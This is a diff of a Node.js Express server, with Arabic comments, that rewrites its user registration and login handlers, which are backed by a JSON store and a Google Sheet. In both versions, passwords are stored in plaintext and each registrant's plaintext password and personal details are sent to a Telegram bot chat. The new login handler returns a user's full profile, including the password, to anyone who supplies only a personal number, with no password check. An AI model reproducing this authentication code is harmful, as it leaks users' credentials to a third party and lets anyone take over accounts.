@@ -453,134 +453,99 @@ app.post('/api/upload', uploadMemory.single('file'), async (req, res) => {
   }
 });
 
-// register
+// --- REPLACE /api/register handler with this ---
 app.post('/api/register', async (req,res)=>{
-  const { name, email, password, phone } = req.body;
-  const personalNumber = req.body.personalNumber || req.body.personal || null;
-  if(!personalNumber) return res.status(400).json({ ok:false, error:'missing personalNumber' });
-  let p = findProfileByPersonal(personalNumber);
-  if(!p){
-    p = { personalNumber: String(personalNumber), name:name||'غير معروف', email:email||'', password:password||'', phone:phone||'', balance:0, canEdit:false };
-    DB.profiles.push(p);
-  } else {
-    p.name = name || p.name;
-    p.email = email || p.email;
-    p.password = password || p.password;
-    p.phone = phone || p.phone;
-    if(typeof p.balance === 'undefined') p.balance = 0;
-  }
-  saveData(DB);
   try {
-  await safeUpsertProfileRow(p);
-} catch(e){
-  console.warn('safe upsert failed for', p.personalNumber, e);
-}
+    const { name, email, password, phone } = req.body || {};
+    let personalNumber = (req.body.personalNumber || req.body.personal || '').toString().trim() || null;
 
-  const text = `تسجيل مستخدم جديد:\nالاسم: ${p.name}\nالبريد: ${p.email || 'لا يوجد'}\nالهاتف: ${p.phone || 'لا يوجد'}\nالرقم الشخصي: ${p.personalNumber}\nكلمة السر: ${p.password || '---'}`;
-  try{
-    const r = await fetch(`https://api.telegram.org/bot${CFG.BOT_LOGIN_REPORT_TOKEN}/sendMessage`, {
-      method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ chat_id: CFG.BOT_LOGIN_REPORT_CHAT, text })
-    });
-    const d = await r.json().catch(()=>null);
-    console.log('register telegram result:', d);
-  }catch(e){ console.warn('send login report failed', e); }
+    // ensure basic fields
+    const safeName = (name || '').toString().trim() || 'غير معروف';
+    const safeEmail = (email || '').toString().trim();
+    const safePassword = (password || '').toString();
+    const safePhone = (phone || '').toString().trim();
 
-  return res.json({ ok:true, profile:p });
-});
-
-// login (محدث: إذا لم يوجد الملف يسجّل واحد جديد تلقائياً)
-// --- START: single /api/login handler (paste and keep only this one) ---
-app.post('/api/login', async (req, res) => {
-  try {
-    const { personalNumber, personal, email, password } = req.body || {};
-    const personalKey = personalNumber || personal || null;
-
-    // إيجاد البروفايل
-    let p = null;
-    if (personalKey) p = findProfileByPersonal(personalKey);
-    else if (email) p = DB.profiles.find(x => x.email && x.email.toLowerCase() === String(email).toLowerCase()) || null;
-
-    // إذا لم يوجد: أنشئ بروفايل جديد مع ضمان رقم شخصي 7 خانات
-    if (!p) {
-      let newPersonal = personalKey ? String(personalKey) : '';
-      if (!/^\d{7}$/.test(newPersonal)) {
-        newPersonal = String(Math.floor(1000000 + Math.random() * 9000000)); // 7 خانات عشوائية
-      }
-      p = {
-        personalNumber: newPersonal,
-        name: req.body.name || 'مستخدم جديد',
-        email: email || '',
-        password: password || '',
-        phone: req.body.phone || '',
-        balance: 0,
-        canEdit: false
-      };
-      DB.profiles.push(p);
-      saveData(DB);
+    // generate unique 7-digit personalNumber when missing
+    const isPersonalTaken = async (pnum) => {
+      if (!pnum) return false;
+      const local = findProfileByPersonal(pnum);
+      if (local) return true;
       try {
-  await safeUpsertProfileRow(p);
-} catch(e){
-  console.warn('safe upsert failed for', p.personalNumber, e);
-}
+        const sheet = await getProfileFromSheet(String(pnum));
+        return !!sheet;
+      } catch(e){ return false; }
+    };
+
+    if (!personalNumber) {
+      // try to generate unique 7-digit
+      let tries = 0;
+      do {
+        personalNumber = String(Math.floor(1000000 + Math.random() * 9000000));
+        tries++;
+        if (tries > 50) break;
+      } while (await isPersonalTaken(personalNumber));
     } else {
-      // إذا وجد: تحقق من كلمة السر إن كانت مخزنة
-      if (typeof p.password !== 'undefined' && String(p.password).length > 0) {
-        if (typeof password === 'undefined' || String(password) !== String(p.password)) {
-          return res.status(401).json({ ok:false, error:'invalid_password' });
-        }
+      // if user provided a personalNumber but already taken -> error
+      if (await isPersonalTaken(personalNumber)) {
+        // allow update instead of error: we will update existing row with provided fields
+        // (fall through to update logic)
       }
     }
 
-    // مزامنة مع الشيت (آمنة مع try/catch)
+    // Build profile object
+    const p = findProfileByPersonal(personalNumber) || { personalNumber: String(personalNumber) };
+    p.name = safeName;
+    p.email = safeEmail;
+    p.password = safePassword;
+    p.phone = safePhone;
+    if (typeof p.balance === 'undefined') p.balance = 0;
+
+    // assign loginNumber (try sheet assignment)
     try {
-      const sheetProf = await getProfileFromSheet(String(p.personalNumber));
-      if (sheetProf) {
-        p.balance = Number(sheetProf.balance || 0);
-        p.name = p.name || sheetProf.name || p.name;
-        p.email = p.email || sheetProf.email || p.email;
-        if (sheetProf.loginNumber) p.loginNumber = Number(sheetProf.loginNumber);
-        saveData(DB);
+      let assigned = null;
+      try { assigned = await assignLoginNumberInProfilesSheet(String(personalNumber)); } catch(e){ assigned = null; }
+      if (assigned) {
+        p.loginNumber = Number(assigned);
       } else {
-        try {
-  await safeUpsertProfileRow(p);
-} catch(e){
-  console.warn('safe upsert failed for', p.personalNumber, e);
-}
+        // fallback local
+        p.loginNumber = assignLoginNumberLocal(String(personalNumber));
       }
-    } catch (e) {
-      console.warn('sheet sync on login failed', e);
+    } catch(e){
+      // fallback
+      p.loginNumber = p.loginNumber || assignLoginNumberLocal(String(personalNumber));
     }
 
-    // تعيين loginNumber إن لم يكن موجوداً
-    try {
-      if (!p.loginNumber) {
-        let assigned = null;
-        try { assigned = await assignLoginNumberInProfilesSheet(String(p.personalNumber)); } catch(e){ assigned = null; }
-        if (assigned) {
-          p.loginNumber = Number(assigned);
-          try {
-  await safeUpsertProfileRow(p);
-} catch(e){
-  console.warn('safe upsert failed for', p.personalNumber, e);
-}
-        } else {
-          p.loginNumber = assignLoginNumberLocal(String(p.personalNumber));
-        }
-        saveData(DB);
-      }
-    } catch (e) {
-      console.warn('login-number assign/check failed', e);
-      if (!p.loginNumber) {
-        p.loginNumber = assignLoginNumberLocal(String(p.personalNumber));
-        saveData(DB);
-      }
+    // persist locally
+    const existingLocal = findProfileByPersonal(personalNumber);
+    if (!existingLocal) {
+      DB.profiles.push(p);
     }
-
-    p.lastLogin = new Date().toISOString();
     saveData(DB);
 
-    // إخراج الحقول المطلوبة للواجهة (تظهر كلمة السر ورقم الهاتف كما طلبت)
-    const out = {
+    // push to Google Sheets (safe upsert)
+    try {
+      await safeUpsertProfileRow({
+        personalNumber: String(p.personalNumber),
+        name: p.name || '',
+        email: p.email || '',
+        password: p.password || '',
+        phone: p.phone || '',
+        balance: String(typeof p.balance !== 'undefined' ? p.balance : 0),
+        loginNumber: String(p.loginNumber || '')
+      });
+    } catch(e){
+      console.warn('safe upsert failed for register', personalNumber, e);
+    }
+
+    // notify (optional)
+    const text = `تسجيل مستخدم جديد:\nالاسم: ${p.name}\nالبريد: ${p.email || 'لا يوجد'}\nالهاتف: ${p.phone || 'لا يوجد'}\nالرقم الشخصي: ${p.personalNumber}\nكلمة السر: ${p.password || '---'}`;
+    try{
+      await fetch(`https://api.telegram.org/bot${CFG.BOT_LOGIN_REPORT_TOKEN}/sendMessage`, {
+        method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ chat_id: CFG.BOT_LOGIN_REPORT_CHAT, text })
+      });
+    }catch(e){ /* ignore */ }
+
+    return res.json({ ok:true, profile: {
       personalNumber: p.personalNumber,
       loginNumber: p.loginNumber || null,
       balance: Number(p.balance || 0),
@@ -588,19 +553,178 @@ app.post('/api/login', async (req, res) => {
       email: p.email || '',
       phone: p.phone || '',
       password: p.password || ''
-    };
+    }});
 
-    // إرسال إشعار تسجيل دخول (غير حرج - لا يمنع الاستجابة)
-    (async ()=>{
-      try{
-        const text = `تسجيل دخول/تسجيل جديد:\nالاسم: ${p.name || 'غير معروف'}\nالرقم الشخصي: ${p.personalNumber}\nرقم الدخول: ${p.loginNumber || '---'}\nالهاتف: ${p.phone || 'لا يوجد'}\nالبريد: ${p.email || 'لا يوجد'}\nالوقت: ${p.lastLogin}`;
-        await fetch(`https://api.telegram.org/bot${CFG.BOT_LOGIN_REPORT_TOKEN}/sendMessage`, {
-          method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ chat_id: CFG.BOT_LOGIN_REPORT_CHAT, text })
-        }).then(r => r.json().catch(()=>null)).catch(()=>null);
-      }catch(e){ /* ignore */ }
-    })();
+  } catch(err) {
+    console.error('register handler error', err);
+    return res.status(500).json({ ok:false, error: err.message || 'server_error' });
+  }
+});
 
-    return res.json({ ok:true, profile: out });
+// --- REPLACE /api/login handler with this ---
+// login: **لم يعد ينشئ حساب تلقائياً** إذا لم يتم العثور على مطابقة كاملة في الشيت/DB.
+// يقوم بالبحث بحسب: (أ) personalNumber إن وُجد، وإلا (ب) يبحث عن صف يطابق الحقول التي أدخلها (name/email/password/phone).
+// لو لم يوجد يرد { ok:true, found:false } — واجهة المستخدم ستعرض زر إنشاء حساب.
+app.post('/api/login', async (req, res) => {
+  try {
+    const { personalNumber, personal, email, password, name, phone } = req.body || {};
+    const personalKey = (personalNumber || personal || '').toString().trim() || null;
+    const qName = (name || '').toString().trim();
+    const qEmail = (email || '').toString().trim();
+    const qPassword = (password || '').toString();
+    const qPhone = (phone || '').toString().trim();
+
+    // 1) If personalKey provided -> try to return that profile (sheet first, then local)
+    if (personalKey) {
+      let sheetProf = null;
+      try { sheetProf = await getProfileFromSheet(String(personalKey)); } catch(e){ sheetProf = null; }
+      if (sheetProf) {
+        // found in sheet -> return authoritative fields
+        return res.json({ ok:true, found:true, profile: {
+          personalNumber: sheetProf.personalNumber,
+          loginNumber: sheetProf.loginNumber || null,
+          balance: Number(sheetProf.balance || 0),
+          name: sheetProf.name || '',
+          email: sheetProf.email || '',
+          phone: sheetProf.phone || '',
+          password: sheetProf.password || ''
+        }});
+      } else {
+        // check local DB
+        const local = findProfileByPersonal(personalKey);
+        if (local) {
+          return res.json({ ok:true, found:true, profile: {
+            personalNumber: local.personalNumber,
+            loginNumber: local.loginNumber || null,
+            balance: Number(local.balance || 0),
+            name: local.name || '',
+            email: local.email || '',
+            phone: local.phone || '',
+            password: local.password || ''
+          }});
+        }
+        // not found by personal
+        return res.json({ ok:true, found:false });
+      }
+    }
+
+    // 2) No personalKey: search sheet for a row matching provided fields (match non-empty inputs)
+    // If user provided email+password (and optional name/phone), require matches on provided fields.
+    // We'll scan sheet rows (A..G).
+    try {
+      if (!sheetsClient || !SPREADSHEET_ID) {
+        // fallback: search local DB for an exact match
+        const localMatch = DB.profiles.find(r => {
+          if (qEmail && r.email.toLowerCase() !== qEmail.toLowerCase()) return false;
+          if (qPassword && String(r.password) !== String(qPassword)) return false;
+          if (qName && String((r.name||'')).toLowerCase() !== qName.toLowerCase()) return false;
+          if (qPhone && String((r.phone||'')).toLowerCase() !== qPhone.toLowerCase()) return false;
+          return true;
+        }) || null;
+        if (localMatch) {
+          return res.json({ ok:true, found:true, profile: {
+            personalNumber: localMatch.personalNumber,
+            loginNumber: localMatch.loginNumber || null,
+            balance: Number(localMatch.balance || 0),
+            name: localMatch.name || '',
+            email: localMatch.email || '',
+            phone: localMatch.phone || '',
+            password: localMatch.password || ''
+          }});
+        }
+        return res.json({ ok:true, found:false });
+      }
+
+      const resp = await sheetsClient.spreadsheets.values.get({
+        spreadsheetId: SPREADSHEET_ID,
+        range: 'Profiles!A2:G10000',
+      });
+      const rows = (resp.data && resp.data.values) || [];
+
+      let matched = null;
+      for (let i = 0; i < rows.length; i++) {
+        const r = rows[i];
+        const rName = (r[1] || '').toString().trim();
+        const rEmail = (r[2] || '').toString().trim();
+        const rPassword = (r[3] || '').toString();
+        const rPhone = (r[4] || '').toString().trim();
+        // require that for every non-empty query field, the sheet value equals (case-insensitive for name/email/phone)
+        if (qEmail && rEmail.toLowerCase() !== qEmail.toLowerCase()) continue;
+        if (qPassword && String(rPassword) !== String(qPassword)) continue;
+        if (qName && rName.toLowerCase() !== qName.toLowerCase()) continue;
+        if (qPhone && rPhone.toLowerCase() !== qPhone.toLowerCase()) continue;
+        // all provided fields matched -> success
+        matched = {
+          rowIndex: i+2,
+          personalNumber: r[0] || '',
+          name: rName,
+          email: rEmail,
+          password: rPassword,
+          phone: rPhone,
+          balance: Number(r[5] || 0),
+          loginNumber: (r[6] != null && String(r[6]).trim() !== '') ? Number(r[6]) : null
+        };
+        break;
+      }
+
+      if (matched) {
+        // merge into local DB
+        const local = findProfileByPersonal(matched.personalNumber);
+        if (local) {
+          local.name = matched.name || local.name;
+          local.email = matched.email || local.email;
+          local.password = matched.password || local.password;
+          local.phone = matched.phone || local.phone;
+          local.balance = typeof matched.balance !== 'undefined' ? Number(matched.balance) : local.balance;
+          local.loginNumber = matched.loginNumber || local.loginNumber;
+        } else {
+          DB.profiles.push({
+            personalNumber: matched.personalNumber,
+            name: matched.name,
+            email: matched.email,
+            password: matched.password,
+            phone: matched.phone,
+            balance: matched.balance || 0,
+            loginNumber: matched.loginNumber || null
+          });
+        }
+        saveData(DB);
+
+        return res.json({ ok:true, found:true, profile: {
+          personalNumber: matched.personalNumber,
+          loginNumber: matched.loginNumber || null,
+          balance: Number(matched.balance || 0),
+          name: matched.name || '',
+          email: matched.email || '',
+          phone: matched.phone || '',
+          password: matched.password || ''
+        }});
+      } else {
+        return res.json({ ok:true, found:false });
+      }
+    } catch(e) {
+      console.warn('login sheet scan error', e);
+      // fallback local search
+      const localMatch = DB.profiles.find(r => {
+        if (qEmail && r.email.toLowerCase() !== qEmail.toLowerCase()) return false;
+        if (qPassword && String(r.password) !== String(qPassword)) return false;
+        if (qName && String((r.name||'')).toLowerCase() !== qName.toLowerCase()) return false;
+        if (qPhone && String((r.phone||'')).toLowerCase() !== qPhone.toLowerCase()) return false;
+        return true;
+      }) || null;
+      if (localMatch) {
+        return res.json({ ok:true, found:true, profile: {
+          personalNumber: localMatch.personalNumber,
+          loginNumber: localMatch.loginNumber || null,
+          balance: Number(localMatch.balance || 0),
+          name: localMatch.name || '',
+          email: localMatch.email || '',
+          phone: localMatch.phone || '',
+          password: localMatch.password || ''
+        }});
+      }
+      return res.json({ ok:true, found:false });
+    }
 
   } catch (err) {
     console.error('login handler error', err);
